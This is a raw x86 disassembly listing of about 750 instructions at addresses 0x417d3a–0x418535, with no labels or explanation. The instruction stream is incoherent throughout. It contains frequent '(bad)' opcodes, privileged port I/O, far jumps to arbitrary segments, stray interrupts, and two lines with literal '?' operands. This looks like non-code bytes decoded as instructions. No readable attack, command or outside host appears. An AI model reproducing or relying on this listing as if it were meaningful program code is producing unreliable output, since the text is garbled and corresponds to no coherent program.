  417d3a:	or     BYTE PTR [edi+0x528814c1],dh
  417d40:	stos   DWORD PTR es:[edi],eax
  417d41:	fsub   DWORD PTR [ebx+0x1138774f]
  417d47:	or     DWORD PTR fs:[edi+0x581c8a3f],esi
  417d4e:	pushf  
  417d4f:	mov    ds:0x4179c819,al
  417d54:	adc    al,BYTE PTR [esi-0x391fddc]
  417d5a:	push   ebx
  417d5b:	jg     0x417da9
  417d5d:	xchg   ebp,eax
  417d5e:	jle    0x417d86
  417d60:	test   BYTE PTR [ebx+ecx*8-0x30b56212],bl
  417d67:	mov    es,WORD PTR [eax-0x6f]
  417d6a:	cli    
  417d6b:	push   ebx
  417d6c:	jmp    0x417da0
  417d6e:	dec    DWORD PTR [esi+ebx*1-0x58d650f4]
  417d75:	xor    cl,bl
  417d77:	pop    edx
  417d78:	popa   
  417d79:	cli    
  417d7a:	push   ebx
  417d7b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  417d7d:	retf   0xbae4
  417d80:	(bad)  
  417d81:	fstp   TBYTE PTR [ebx+0x478f26ff]
  417d87:	mov    ebp,0x76d4d63f
  417d8c:	nop
  417d8d:	mov    esi,0xca78111d
  417d92:	fs jl  0x417e09
  417d95:	fist   WORD PTR [eax-0x73]
  417d98:	(bad)
  417d9c:	mov    WORD PTR [edi-0x4d],fs
  417d9f:	pop    es
  417da0:	mov    eax,ds:0x80b1613f
  417da5:	retf   
  417da6:	xchg   edi,eax
  417da7:	ror    cl,1
  417da9:	ja     0x417d7a
  417dab:	out    dx,eax
  417dac:	and    ch,ch
  417dae:	outs   dx,DWORD PTR ds:[esi]
  417daf:	(bad)  
  417db0:	jmp    0x417d8f
  417db2:	ret    0x29f8
  417db5:	pop    ss
  417db6:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  417db8:	repz dec esi
  417dba:	fmul   DWORD PTR [edx-0x33b1bd1]
  417dc0:	and    al,0xa7
  417dc2:	lods   eax,DWORD PTR ds:[esi]
  417dc3:	clc    
  417dc4:	arpl   WORD PTR [edx+esi*8],sp
  417dc7:	sahf   
  417dc8:	adc    dl,BYTE PTR [esi]
  417dca:	(bad)  
  417dcb:	aad    0x18
  417dcd:	pop    ss
  417dce:	das    
  417dcf:	and    eax,0xcc0bf4fa
  417dd4:	leave  
  417dd5:	sbb    eax,0xaceb8a31
  417dda:	cmp    ch,bl
  417ddc:	shl    DWORD PTR [edi],1
  417dde:	or     eax,0xd1ef07aa
  417de3:	lods   al,BYTE PTR ds:[esi]
  417de4:	mov    dl,0xcc
  417de6:	pop    esp
  417de7:	popa   
  417de8:	or     DWORD PTR [eax+edi*4],ebx
  417deb:	add    dh,al
  417ded:	jbe    0x417dec
  417def:	jns    0x417e30
  417df1:	out    dx,al
  417df2:	pop    ds
  417df3:	pop    eax
  417df4:	es mov edx,0x8ca828ac
  417dfa:	mov    esi,0xcbc33ba
  417dff:	pop    edi
  417e00:	adc    eax,0x86bf8e4f
  417e05:	mov    dl,BYTE PTR [ebp-0x227a4898]
  417e0b:	pop    ss
  417e0c:	mov    cl,0x4a
  417e0e:	loopne 0x417dc2
  417e10:	xchg   DWORD PTR [ecx+0x1b],ecx
  417e13:	int3   
  417e14:	hlt    
  417e15:	and    eax,0xb0f4c708
  417e1a:	or     ah,BYTE PTR ds:0xc88a5028
  417e20:	sbb    al,BYTE PTR [ebp+eax*2+0x5b7b3d50]
  417e27:	pop    es
  417e28:	pushf  
  417e29:	(bad)  
  417e2a:	clc    
  417e2b:	out    dx,al
  417e2c:	xchg   esi,edx
  417e2e:	mov    eax,ds:0x671401ce
  417e33:	repnz rol BYTE PTR [esi],cl
  417e36:	pop    es
  417e37:	out    dx,al
  417e38:	or     eax,DWORD PTR [ecx]
  417e3a:	inc    ecx
  417e3b:	xlat   BYTE PTR ds:[ebx]
  417e3c:	cmp    eax,0x37ab947
  417e41:	ror    BYTE PTR [ecx+0x48],1
  417e44:	ret    0xe390
  417e47:	sub    al,0x93
  417e49:	out    dx,al
  417e4a:	pop    edx
  417e4b:	add    DWORD PTR [esi*1+0x595791a6],ecx
  417e52:	mov    ecx,0x59390f21
  417e57:	imul   ecx,ebp,0xffffffde
  417e5a:	push   ebx
  417e5b:	xchg   DWORD PTR [ebx-0x7a],ebp
  417e5e:	adc    al,0x85
  417e60:	jo     0x417ea0
  417e62:	shl    al,1
  417e64:	dec    edi
  417e65:	shr    DWORD PTR [ebp+0x17],0xa1
  417e69:	xor    dh,BYTE PTR [esi+ebx*4-0x75886c96]
  417e70:	leave  
  417e71:	jnp    0x417e0b
  417e73:	ss inc edi
  417e75:	mov    cl,0xce
  417e77:	xor    DWORD PTR [esi-0x1d6d733b],0xffffff9b
  417e7e:	xor    DWORD PTR [edx+0x11bc408d],0x61
  417e85:	cld    
  417e86:	ins    BYTE PTR es:[edi],dx
  417e87:	loop   0x417edf
  417e89:	ror    DWORD PTR [edi+edx*2+0x5d],0xdf
  417e8e:	or     DWORD PTR ds:0x6106c596,ebx
  417e94:	mov    ebp,0x5e33d456
  417e99:	shl    dh,1
  417e9b:	sub    esp,DWORD PTR [eax+edx*8-0x1b2d4e05]
  417ea2:	sbb    al,bl
  417ea4:	sbb    al,0xa8
  417ea6:	scas   eax,DWORD PTR es:[edi]
  417ea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ea8:	push   ebp
  417ea9:	fstp   TBYTE PTR [ecx-0x17]
  417eac:	(bad)  
  417ead:	jg     0x417ec0
  417eaf:	icebp  
  417eb0:	and    eax,0xbc3bcf5c
  417eb5:	pusha  
  417eb6:	ss mov ecx,0x6d7c69a4
  417ebc:	xchg   ebp,eax
  417ebd:	push   ebx
  417ebe:	das    
  417ebf:	stc    
  417ec0:	fst    QWORD PTR [edi]
  417ec2:	iret   
  417ec3:	enter  0x9dc6,0xa6
  417ec7:	push   ebp
  417ec8:	mov    BYTE PTR ds:0x3343593b,ch
  417ece:	push   ebp
  417ecf:	mov    edx,?
  417ed1:	push   ebx
  417ed2:	mov    ?,WORD PTR [ecx-0x4e2970c1]
  417ed8:	xor    DWORD PTR [ebp-0x15],ebx
  417edb:	mov    ch,0x2
  417edd:	out    dx,eax
  417ede:	les    edx,FWORD PTR [esi-0x56]
  417ee1:	jo     0x417ef5
  417ee3:	lods   eax,DWORD PTR ds:[esi]
  417ee4:	add    esp,DWORD PTR ds:0x4801f7c3
  417eea:	ret    0x57e4
  417eed:	add    ebp,edx
  417eef:	mov    esi,ds
  417ef1:	div    DWORD PTR [ebx+0x48]
  417ef4:	addr16 pop edi
  417ef6:	jb     0x417e95
  417ef8:	leave  
  417ef9:	sub    edx,DWORD PTR [esi]
  417efb:	(bad)  
  417efc:	lock daa 
  417efe:	or     BYTE PTR [eax+0x73ea701c],dh
  417f04:	mov    ch,0x4b
  417f06:	mov    ebx,0x1b44c0b5
  417f0b:	xor    DWORD PTR [edx-0x639ae4fa],esi
  417f11:	mov    ebx,DWORD PTR [esi+esi*2]
  417f14:	mov    ds:0xd9004440,eax
  417f19:	inc    eax
  417f1a:	and    BYTE PTR [ebx-0x46],0x56
  417f1e:	ret    0x1b14
  417f21:	sbb    al,0x4b
  417f23:	rcr    DWORD PTR [esi+0x675336c2],cl
  417f29:	mov    ch,0x69
  417f2b:	dec    ebx
  417f2c:	loope  0x417eb1
  417f2e:	adc    DWORD PTR [edx+0x34ddd910],edi
  417f34:	call   0x2c17:0x5d3c520c
  417f3b:	and    ebp,ebp
  417f3d:	mov    ch,0x10
  417f3f:	adc    ebx,DWORD PTR [edx+eiz*1+0x64]
  417f43:	adc    BYTE PTR ds:0xc1f4def5,0x6d
  417f4a:	pop    esi
  417f4b:	mov    ds:0x506a93fa,eax
  417f50:	addr16 mov esp,0xb1dda89f
  417f56:	or     edi,ebp
  417f58:	jle    0x417f21
  417f5a:	cmp    al,0x6e
  417f5c:	push   ebp
  417f5d:	es sahf 
  417f5f:	div    dh
  417f61:	ja     0x417ee5
  417f63:	fistp  QWORD PTR [ecx-0x69]
  417f66:	in     al,0x9f
  417f68:	mov    ds:0x435d85b7,al
  417f6d:	xor    ebx,esi
  417f6f:	sub    esp,DWORD PTR [edi-0x36e98b66]
  417f75:	(bad)  
  417f76:	jns    0x417f43
  417f78:	cmp    ecx,DWORD PTR [ecx-0x29]
  417f7b:	or     eax,0x26eec0d0
  417f80:	sbb    BYTE PTR [ecx-0x56],0xa3
  417f84:	aam    0x94
  417f86:	or     eax,0x7186f884
  417f8b:	push   ebx
  417f8c:	test   DWORD PTR [edx],eax
  417f8e:	jge    0x417fbb
  417f90:	pop    esi
  417f91:	sub    eax,0xb7775cbc
  417f96:	dec    edi
  417f97:	xor    al,0x5b
  417f99:	test   dl,0xa9
  417f9c:	fucomp st(0)
  417f9e:	ins    DWORD PTR es:[edi],dx
  417f9f:	pop    esp
  417fa0:	add    BYTE PTR [eax],ch
  417fa2:	xor    BYTE PTR [edx+eiz*4],al
  417fa5:	xchg   ecx,eax
  417fa6:	or     al,BYTE PTR [edi]
  417fa8:	dec    esi
  417fa9:	xchg   ebp,eax
  417faa:	fwait
  417fab:	jne    0x417fe6
  417fad:	cwde   
  417fae:	adc    eax,0x34672e39
  417fb3:	adc    ebx,DWORD PTR ds:0x88bb6bbf
  417fb9:	fidivr DWORD PTR [ecx-0x4c]
  417fbc:	out    0xac,eax
  417fbe:	jo     0x417f44
  417fc0:	ss inc ebp
  417fc2:	jl     0x418043
  417fc4:	dec    eax
  417fc5:	cmp    eax,0xccf27e06
  417fca:	imul   ebp,DWORD PTR [ebx+eiz*1+0x71743e41],0x34
  417fd2:	ins    BYTE PTR es:[edi],dx
  417fd3:	push   edx
  417fd4:	out    0xee,eax
  417fd6:	pop    ebx
  417fd7:	cld    
  417fd8:	arpl   cx,dx
  417fda:	pop    ebp
  417fdb:	mov    ebp,0x558521d9
  417fe0:	and    cl,BYTE PTR [edi+0x605a1d60]
  417fe6:	jmp    0xa25691eb
  417feb:	push   0x30c4d66c
  417ff0:	push   esp
  417ff1:	or     al,0x3e
  417ff3:	mov    BYTE PTR [ebx],dl
  417ff5:	popf   
  417ff6:	xchg   esp,eax
  417ff7:	push   edi
  417ff8:	fisttp DWORD PTR [edi+0x62]
  417ffb:	inc    esi
  417ffc:	pop    ebp
  417ffd:	jl     0x417fca
  417fff:	inc    edi
  418000:	xor    ch,BYTE PTR [ebx+0x7]
  418003:	mov    ah,0x4
  418005:	cli    
  418006:	mov    edi,DWORD PTR [ebx+edi*8-0x63]
  41800a:	jl     0x418006
  41800c:	add    BYTE PTR [eax-0x9b26bcb],bl
  418012:	sub    DWORD PTR [ecx*1+0x216bc1cf],0xed97ca22
  41801d:	jno    0x418049
  41801f:	daa    
  418020:	out    0x65,al
  418022:	idiv   DWORD PTR [ebx]
  418024:	ins    DWORD PTR es:[edi],dx
  418025:	out    dx,eax
  418026:	(bad)  
  418027:	sub    dh,ah
  418029:	sub    edi,DWORD PTR [ecx+esi*8]
  41802c:	das    
  41802d:	jno    0x417fcb
  41802f:	xchg   esi,eax
  418030:	push   0xec0701d7
  418035:	daa    
  418036:	mov    ds:0x9fbd6c7a,eax
  41803b:	push   ecx
  41803c:	dec    edi
  41803d:	inc    ebx
  41803e:	add    DWORD PTR [esi-0x3e],edi
  418041:	pop    esi
  418042:	call   0xe35ae091
  418047:	call   0xb8a51ce5
  41804c:	mov    eax,0xeaec32c4
  418051:	push   cs
  418052:	or     eax,0xfbd61a9c
  418057:	and    al,0x9
  418059:	cmp    eax,0x8b2b34e9
  41805e:	dec    ecx
  41805f:	mov    bh,0x62
  418061:	push   esi
  418062:	sub    BYTE PTR [edx+0x1addee8],cl
  418068:	cmp    al,bl
  41806a:	xor    BYTE PTR [ebx-0x6866c658],dh
  418070:	pusha  
  418071:	test   al,0x1
  418073:	mov    bl,0xe4
  418075:	lds    edi,FWORD PTR [ebx]
  418077:	add    DWORD PTR [edi+0x61db6dfb],edx
  41807d:	(bad)  
  41807f:	xor    dh,ah
  418081:	cmp    al,0xe5
  418083:	inc    ebx
  418084:	jno    0x4180c2
  418086:	xlat   BYTE PTR ds:[ebx]
  418087:	or     ah,BYTE PTR [edx]
  418089:	loope  0x418074
  41808b:	mov    esi,0x858cb237
  418090:	add    al,0xc6
  418092:	retf   0xa176
  418095:	cwde   
  418096:	mov    BYTE PTR [edi-0x37fc8ef7],0xb4
  41809d:	psubw  mm2,QWORD PTR [edi-0x34fa6913]
  4180a4:	cdq    
  4180a5:	repz sub eax,DWORD PTR ds:[eax]
  4180a9:	cmp    esp,DWORD PTR [ecx-0x3d]
  4180ac:	icebp  
  4180ad:	cli    
  4180ae:	mov    ds:0x7b0ee82f,eax
  4180b3:	test   bl,dh
  4180b5:	stc    
  4180b6:	adc    DWORD PTR ds:[esi-0x7a],ebx
  4180ba:	push   esp
  4180bb:	into   
  4180bc:	push   edi
  4180bd:	mov    eax,0x507d8d1c
  4180c2:	je     0x418056
  4180c4:	shl    DWORD PTR [eax+eiz*2-0x4dd6be9b],cl
  4180cb:	daa    
  4180cc:	(bad)  
  4180cd:	push   esp
  4180ce:	fs inc edi
  4180d0:	cmp    al,0x42
  4180d2:	cmp    al,0x86
  4180d4:	jecxz  0x418122
  4180d6:	or     esi,DWORD PTR [ecx-0x7b]
  4180d9:	js     0x4180ea
  4180db:	jbe    0x4180aa
  4180dd:	mov    ecx,0x401f537a
  4180e2:	dec    esi
  4180e3:	xchg   ecx,eax
  4180e4:	xchg   ecx,eax
  4180e5:	and    ebp,eax
  4180e7:	mov    dl,cl
  4180e9:	cmp    esp,DWORD PTR [ebx+0x7850c080]
  4180ef:	into   
  4180f0:	test   al,0x6c
  4180f2:	imul   ebp,DWORD PTR [ebp+0x12],0xafcce2c7
  4180f9:	jmp    0xb108c32
  4180fe:	jmp    DWORD PTR [ebp+eax*4-0x3b]
  418102:	psubw  mm0,QWORD PTR [edx]
  418105:	add    DWORD PTR ds:0x6b3f9b96,esi
  41810b:	push   esi
  41810c:	repnz (bad) 
  41810e:	and    al,0xba
  418110:	mov    al,0x4f
  418112:	shl    esi,cl
  418114:	inc    esp
  418115:	mov    esi,0x2eb6fc54
  41811a:	iret   
  41811b:	push   ds
  41811c:	sbb    edx,DWORD PTR [ebx]
  41811e:	and    DWORD PTR [ecx-0x2e],edx
  418121:	mov    cl,BYTE PTR [eax+ecx*4-0x2bc3c48]
  418128:	jp     0x418102
  41812a:	mov    ecx,0xb17ebf72
  41812f:	arpl   WORD PTR [eax+ecx*8+0x14],ax
  418133:	repz cmp dh,ch
  418136:	push   edi
  418137:	or     eax,DWORD PTR [edi+esi*4-0x7bddfb2e]
  41813e:	out    0xab,eax
  418140:	ss je  0x4181bb
  418143:	adc    al,0xac
  418145:	jg     0x4181af
  418147:	inc    edi
  418148:	popf   
  418149:	int3   
  41814a:	and    BYTE PTR [eax-0x70a02156],al
  418150:	or     eax,0xbdb1fd18
  418155:	test   al,0x7b
  418157:	or     eax,0x91eb1b11
  41815c:	mov    ch,0x22
  41815e:	je     0x4181d3
  418160:	aas    
  418161:	mov    edi,0x59fdbc1d
  418166:	loopne 0x4181bb
  418168:	stos   DWORD PTR es:[edi],eax
  418169:	jg     0x418169
  41816b:	pop    ebp
  41816c:	imul   ecx,ecx,0x13
  41816f:	(bad)
  418172:	mov    DWORD PTR [ebx],ebp
  418174:	out    0x21,al
  418176:	push   0xffffffa1
  418178:	pop    edx
  418179:	pop    edi
  41817b:	sbb    esi,edi
  41817d:	lds    eax,FWORD PTR [ebp-0x12]
  418180:	and    DWORD PTR [ebx+eiz*8+0x4740ef54],0xdb5ec425
  41818b:	call   FWORD PTR [eax]
  41818d:	cmp    dh,bl
  41818f:	mov    dh,0x85
  418191:	add    esi,ecx
  418193:	rol    BYTE PTR [edi+ecx*8-0x51],0xf
  418198:	mul    DWORD PTR [ecx-0x6b]
  41819b:	cmc    
  41819c:	popa   
  41819d:	popa   
  41819e:	ret    0x3285
  4181a1:	push   0xffffffa5
  4181a3:	leave  
  4181a4:	fisub  WORD PTR ds:0x2a2c6861
  4181aa:	daa    
  4181ab:	xchg   edi,eax
  4181ac:	adc    BYTE PTR [esi+0x30],ch
  4181af:	loop   0x418205
  4181b1:	push   es
  4181b2:	jp     0x4181b2
  4181b4:	mov    esp,0x84b1c7bd
  4181b9:	mov    ecx,0xbb24db0e
  4181be:	lds    ecx,FWORD PTR ds:0x935777ed
  4181c4:	sub    dh,cl
  4181c6:	jbe    0x418164
  4181c8:	adc    al,BYTE PTR [ebx]
  4181ca:	jge    0x4181a3
  4181cc:	in     eax,0x48
  4181ce:	mov    dh,0xca
  4181d0:	test   BYTE PTR [esi-0x54a81686],dl
  4181d6:	dec    eax
  4181d7:	xchg   ebp,eax
  4181d8:	mov    ecx,0xd9340bea
  4181dd:	jnp    0x4181db
  4181df:	mov    ah,0xbb
  4181e1:	mov    ch,0x59
  4181e3:	in     eax,0x69
  4181e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e6:	(bad)
  4181e9:	inc    edi
  4181ea:	dec    esp
  4181eb:	cmp    al,0x45
  4181ed:	loop   0x418230
  4181ef:	std    
  4181f0:	and    ecx,0x505ea92c
  4181f6:	push   ds
  4181f7:	ja     0x4181a6
  4181f9:	hlt    
  4181fa:	inc    ecx
  4181fb:	dec    ecx
  4181fc:	aam    0xcb
  4181fe:	sbb    eax,0x6e233c6b
  418203:	pop    es
  418204:	jle    0x4181e1
  418206:	and    al,0x7e
  418208:	fnstsw WORD PTR [eax+0x5d90b346]
  41820e:	dec    BYTE PTR [edx-0x45]
  418211:	mov    al,0x95
  418213:	jg     0x418279
  418215:	push   ss
  418216:	mov    ds:0xcdcf0db4,al
  41821b:	add    DWORD PTR [edi],0xffffffc2
  41821e:	dec    esp
  41821f:	add    al,0x7e
  418221:	and    DWORD PTR [eax+0x72466c33],esi
  418227:	pop    es
  418228:	outs   dx,DWORD PTR ds:[esi]
  418229:	mov    DWORD PTR [ecx],0xe3002bf8
  41822f:	sbb    BYTE PTR [ebp+0x79],ch
  418232:	jne    0x4182ab
  418234:	push   ebx
  418235:	fwait
  418236:	xchg   DWORD PTR [ebp-0x6a],ebp
  418239:	sbb    esi,DWORD PTR [eax+0x6fbb845c]
  41823f:	pushf  
  418240:	mov    WORD PTR [ebx],ds
  418242:	nop
  418243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418244:	sub    eax,DWORD PTR [edx-0x80]
  418247:	mov    ah,0xb4
  418249:	inc    esp
  41824a:	mov    bl,0x57
  41824c:	jns    0x4181ee
  41824e:	mov    al,0xd
  418250:	imul   eax,DWORD PTR [edx+edx*2+0x5ba92743],0x6d
  418258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418259:	adc    DWORD PTR [eax],eax
  41825b:	fs or  al,0x33
  41825e:	lock out dx,al
  418260:	daa    
  418261:	and    ecx,DWORD PTR [ecx+0x6e9ab975]
  418267:	sub    cl,BYTE PTR [edx-0x71e36050]
  41826d:	mov    bh,0x8e
  41826f:	inc    ecx
  418270:	aas    
  418271:	into   
  418272:	and    al,0xae
  418274:	mov    bh,0xca
  418276:	jle    0x4182ac
  418278:	sub    cl,BYTE PTR [ebp+0x331b1493]
  41827e:	and    eax,ecx
  418280:	cmp    eax,0x1826a2f7
  418285:	mov    al,ds:0x683572cc
  41828a:	inc    ebx
  41828b:	ror    BYTE PTR [edi-0x65],1
  41828e:	and    DWORD PTR [edi+0x7ed306b7],edx
  418294:	out    0x89,eax
  418296:	and    BYTE PTR [eax+0x6d],ch
  418299:	and    dh,BYTE PTR [ecx]
  41829b:	les    edi,FWORD PTR [ecx]
  41829d:	sti    
  41829e:	add    DWORD PTR [edi-0x592d1d6e],edx
  4182a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182a5:	aas    
  4182a6:	dec    ebx
  4182a7:	fwait
  4182a8:	jmp    0x7d1f:0xa1446df1
  4182af:	adc    BYTE PTR [esi-0x54],dl
  4182b2:	neg    BYTE PTR [ebp-0x62]
  4182b5:	aad    0x68
  4182b7:	xchg   ebx,eax
  4182b8:	movnti DWORD PTR ds:0x45f5a152,edi
  4182bf:	(bad)  
  4182c0:	mov    eax,0x7a277b30
  4182c5:	mov    al,0xa1
  4182c7:	sti    
  4182c8:	inc    edi
  4182c9:	pop    esi
  4182ca:	les    ebx,FWORD PTR [esi+0x2ff6368f]
  4182d0:	cmp    BYTE PTR [ecx],al
  4182d2:	jbe    0x41833d
  4182d4:	mov    DWORD PTR [edi-0x21049223],esi
  4182da:	inc    eax
  4182db:	mov    edi,0x8581073a
  4182e0:	jnp    0x4182ec
  4182e2:	xor    ah,cl
  4182e4:	pushf  
  4182e5:	cmp    BYTE PTR [edx+0x65ed3824],0xae
  4182ec:	aas    
  4182ed:	push   ss
  4182ee:	fimul  WORD PTR [ebx-0x48c97150]
  4182f4:	mov    eax,ds:0xf55375a3
  4182f9:	dec    edx
  4182fa:	xchg   edx,eax
  4182fb:	dec    esi
  4182fc:	pop    es
  4182fd:	ds xor bl,ah
  418300:	xor    edi,DWORD PTR [ecx-0x1b7d3c73]
  418306:	xor    al,0x25
  418308:	push   ss
  418309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41830a:	shl    BYTE PTR [edi+0x28],cl
  41830d:	cmp    ebp,DWORD PTR [ebx+eax*2-0x343d944c]
  418314:	fucomp st(3)
  418316:	mov    dh,0xaa
  418318:	xchg   edx,eax
  418319:	or     dh,BYTE PTR [ebp+ecx*8+0x43761b7d]
  418320:	lods   al,BYTE PTR ds:[esi]
  418321:	push   0x37
  418323:	sti    
  418324:	push   eax
  418325:	xchg   DWORD PTR [edi*4+0x67f2b56a],ecx
  41832c:	sbb    bl,BYTE PTR [ebp-0x7d]
  41832f:	(bad)  
  418330:	int    0x23
  418332:	loopne 0x418361
  418334:	mov    esi,0xcb6c5ca2
  418339:	xor    DWORD PTR [ebp-0x32],eax
  41833c:	fild   WORD PTR [edi+0x5d]
  41833f:	les    ecx,FWORD PTR [ecx]
  418341:	dec    edi
  418342:	test   DWORD PTR [esi+0x7b450156],eax
  418348:	test   DWORD PTR [ecx-0x31],edx
  41834b:	cmp    eax,0x95d9143b
  418350:	mov    dh,0xe6
  418352:	imul   DWORD PTR [eax]
  418354:	or     eax,0xcd775e44
  418359:	sbb    bl,BYTE PTR [edi-0x3a]
  41835c:	cmc    
  41835d:	sbb    al,0xf8
  41835f:	xlat   BYTE PTR ds:[ebx]
  418360:	push   edx
  418361:	loopne 0x418336
  418363:	ss loope 0x4183bd
  418366:	into   
  418367:	ja     0x418346
  418369:	adc    DWORD PTR [ecx+0x4d58eaf7],edi
  41836f:	pop    es
  418370:	xchg   esi,eax
  418371:	cmp    al,0x3e
  418373:	sub    esp,0xffffffdd
  418376:	push   esi
  418377:	mov    al,0x4f
  418379:	sbb    BYTE PTR [ebx-0x2495ce96],ah
  41837f:	jo     0x41839b
  418381:	push   edx
  418382:	jmp    0x418377
  418384:	pop    ebx
  418385:	cmp    ch,BYTE PTR [eax-0x62]
  418388:	outs   dx,DWORD PTR ds:[esi]
  418389:	cmovo  eax,DWORD PTR ds:0x78c75032
  418390:	add    al,0xff
  418392:	push   0xffffff9d
  418394:	ds dec esp
  418396:	shl    BYTE PTR [ebx-0x9],cl
  418399:	cmp    bl,BYTE PTR ds:0x4c778954
  41839f:	scas   al,BYTE PTR es:[edi]
  4183a0:	in     eax,0x66
  4183a2:	loope  0x418353
  4183a4:	mov    edx,0x1d663178
  4183a9:	(bad)
  4183ac:	fldcw  WORD PTR [eax-0x7cc855d3]
  4183b2:	ror    DWORD PTR [eax-0x7],1
  4183b5:	and    al,BYTE PTR [esi]
  4183b7:	je     0x418387
  4183b9:	(bad)  
  4183ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183bb:	dec    edx
  4183bc:	pop    edi
  4183bd:	sub    edx,edi
  4183bf:	jno    0x41835b
  4183c1:	push   ecx
  4183c2:	push   edi
  4183c3:	inc    ebp
  4183c4:	retf   0xb057
  4183c7:	ret    
  4183c8:	fs or  eax,0xf83dac11
  4183ce:	mov    edx,0xaf64123e
  4183d3:	aaa    
  4183d4:	xchg   DWORD PTR [ebx],esi
  4183d6:	fmul   DWORD PTR [ecx]
  4183d8:	stos   DWORD PTR es:[edi],eax
  4183d9:	adc    BYTE PTR [ebx+edi*4-0x4b6f8193],0xee
  4183e1:	xor    DWORD PTR [edx],edi
  4183e3:	push   ebp
  4183e4:	pop    esp
  4183e5:	dec    esi
  4183e6:	in     al,0xdd
  4183e8:	loopne 0x4183e2
  4183ea:	mov    ah,al
  4183ec:	inc    bl
  4183ee:	sbb    bh,0xb3
  4183f1:	inc    esi
  4183f2:	(bad)  
  4183f3:	xchg   ecx,eax
  4183f4:	sbb    eax,0xfc22d43c
  4183f9:	enter  0xd274,0xf0
  4183fd:	or     eax,DWORD PTR [edi+0x4c]
  418400:	push   0xe000b23
  418405:	ficomp WORD PTR [eax]
  418407:	inc    eax
  418408:	jecxz  0x4183dd
  41840a:	not    ah
  41840c:	mov    eax,0x92fcf72
  418411:	mov    bh,0x56
  418413:	iret   
  418414:	cmp    al,0xc8
  418416:	fcom   DWORD PTR [eax]
  418418:	into   
  418419:	pop    edx
  41841a:	jne    0x4183b9
  41841c:	xchg   ecx,eax
  41841d:	sbb    al,ah
  41841f:	pop    ebx
  418420:	pop    edx
  418421:	mov    edi,0x52e025b
  418426:	inc    esi
  418427:	jmp    0x9dc7:0x56f25a7b
  41842e:	(bad)  
  41842f:	imul   edi,ecx,0xfffffff6
  418432:	xor    eax,0xd1f9a77f
  418437:	xor    ah,bl
  418439:	inc    ebx
  41843a:	mov    bl,0xf8
  41843c:	add    DWORD PTR [edx-0x51ad66fd],esi
  418442:	pop    edx
  418443:	dec    esp
  418444:	push   ss
  418445:	cs pushf 
  418447:	push   edi
  418448:	retf   
  418449:	repz xor edi,DWORD PTR [ebx-0x419b14d8]
  418450:	scas   eax,DWORD PTR es:[edi]
  418451:	in     eax,0x8d
  418453:	cmp    al,0x3e
  418455:	js     0x418466
  418457:	push   esi
  418458:	dec    esp
  418459:	or     BYTE PTR cs:[ebx],ch
  41845c:	xor    BYTE PTR [edx-0x48737a50],bl
  418462:	sub    eax,0xea833605
  418467:	(bad)  
  418468:	rcl    DWORD PTR [ecx+eiz*2+0x5e633d00],0x92
  418470:	jle    0x418492
  418472:	fst    QWORD PTR [ebp+edx*8+0x39]
  418476:	scas   al,BYTE PTR es:[edi]
  418477:	mov    ch,0xf0
  418479:	or     ah,BYTE PTR [eax]
  41847b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41847c:	lea    eax,[ecx]
  41847e:	dec    edi
  41847f:	fisub  WORD PTR [ecx+0x70]
  418482:	add    eax,0xea7d83e0
  418487:	inc    esp
  418488:	push   ebp
  418489:	gs ret 
  41848b:	xchg   ebp,eax
  41848c:	mov    edx,0x6bc9b98f
  418491:	xchg   ecx,eax
  418492:	ret    
  418493:	jmp    0xdbfe:0x6a8218b7
  41849a:	mov    ds:0x16496227,eax
  41849f:	mov    bh,0xf6
  4184a1:	cmp    cl,BYTE PTR [edi]
  4184a3:	loop   0x4184d5
  4184a5:	add    esp,DWORD PTR [eax+0x6f]
  4184a8:	fs leave 
  4184aa:	outs   dx,BYTE PTR ds:[esi]
  4184ab:	call   0x8ac8:0xfd65b597
  4184b2:	inc    edx
  4184b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b4:	pop    ebp
  4184b5:	mov    cl,0xc3
  4184b7:	test   ah,ch
  4184b9:	sbb    dl,BYTE PTR [esi+0x4a26b460]
  4184bf:	cmp    BYTE PTR [esi],0x3c
  4184c2:	adc    eax,0x7ea217a3
  4184c7:	psubw  mm4,QWORD PTR es:[esp+ebp*8-0x66]
  4184cd:	jmp    0xcd33aa34
  4184d2:	pop    eax
  4184d3:	retf   0x38
  4184d6:	or     al,0xc9
  4184d8:	pop    ds
  4184d9:	jns    0x41851e
  4184db:	stos   DWORD PTR es:[edi],eax
  4184dc:	aas    
  4184dd:	push   eax
  4184de:	lahf   
  4184df:	jmp    0x418482
  4184e1:	jp     0x4184e3
  4184e3:	or     al,cl
  4184e5:	popa   
  4184e6:	sbb    cl,dh
  4184e8:	xor    eax,0xa669718f
  4184ed:	pop    ebp
  4184ee:	xor    BYTE PTR [ecx],0xe5
  4184f1:	push   esp
  4184f2:	div    DWORD PTR [eax-0x4aa4f08]
  4184f8:	inc    ebx
  4184f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184fa:	xlat   BYTE PTR ds:[ebx]
  4184fb:	xor    ebp,DWORD PTR [ebp+0x5c]
  4184fe:	fisub  WORD PTR [ecx]
  418500:	int    0x6b
  418502:	test   al,0x4
  418504:	dec    ebx
  418505:	test   al,0x88
  418507:	outs   dx,BYTE PTR ds:[esi]
  418508:	mov    DWORD PTR [ebp+0x318f945],edx
  41850e:	mov    ebp,0xcd4d822f
  418513:	dec    esi
  418514:	jbe    0x418536
  418516:	cmp    dh,BYTE PTR [edi+0x26]
  418519:	fbstp  TBYTE PTR [ecx-0x2b]
  41851c:	das    
  41851d:	xchg   DWORD PTR [ebp+0x3c],esi
  418520:	out    dx,eax
  418521:	push   edx
  418522:	inc    esp
  418523:	inc    esp
  418524:	pop    edi
  418525:	push   ds
  418526:	lahf   
  418527:	aas    
  418528:	xchg   esi,eax
  418529:	pop    edi
  41852a:	inc    ebp
  41852b:	(bad)  
  41852c:	in     al,dx
  41852d:	in     eax,0x8f
  41852f:	cmp    esi,0xffffffa7
  418532:	out    0x32,eax
  418534:	dec    edx
  418535:	xor    al,0x94
